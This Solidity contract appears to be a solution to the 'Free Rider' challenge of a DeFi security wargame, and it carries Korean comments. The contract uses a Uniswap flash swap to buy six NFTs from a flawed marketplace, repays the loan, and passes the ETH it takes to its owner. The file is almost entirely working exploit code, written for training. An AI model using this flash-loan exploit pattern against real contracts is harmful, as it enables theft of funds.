// SPDX-License-Identifier: MIT
pragma solidity >=0.4.23 <0.9.0;

// import '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';
import '@openzeppelin/contracts/token/ERC721/IERC721.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import './FreeRiderNFTMarketplace.sol';
import './FreeRiderBuyer.sol';
//import './../WETH9.sol';
import "hardhat/console.sol";

interface IWETH {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function deposit() external payable;
    function withdraw(uint amount) external;
    function balanceOf(address addr) external returns (uint);

}

contract AttackerFreeRider is IUniswapV2Callee {

    IUniswapV2Pair public immutable pair;
    FreeRiderNFTMarketplace public immutable marketplace;
    FreeRiderBuyer public immutable partener;
    address payable public  owner;
    IERC721 public immutable nft;
    IWETH public immutable weth;

    uint256[] public tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(address _pair, address _nft, address _marketplace, address _partener, address _weth) {
        pair = IUniswapV2Pair(_pair);
        nft = IERC721(_nft);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        partener = FreeRiderBuyer(_partener);
        weth = IWETH(_weth);
        owner = payable(msg.sender);
    }

    function attackMarketPlace(uint256 amount) public payable {
        // pair의 swap을 실행시키면 line 33의 uniswapV2Call function 이 실행됨
        // uniswapV2Pair.sol 보기
        pair.swap(amount, 0, address(this), new bytes(1));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        
        weth.withdraw(amount0);

        marketplace.buyMany{value: 15 ether}(tokenIds);
        
        weth.deposit{value: 16 ether}();
        weth.transfer(address(pair), uint(16e18));
        
        for(uint256 i=0; i< tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), address(partener), i);
        }

        owner.transfer(address(this).balance);

    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }



    receive() external payable {}

}
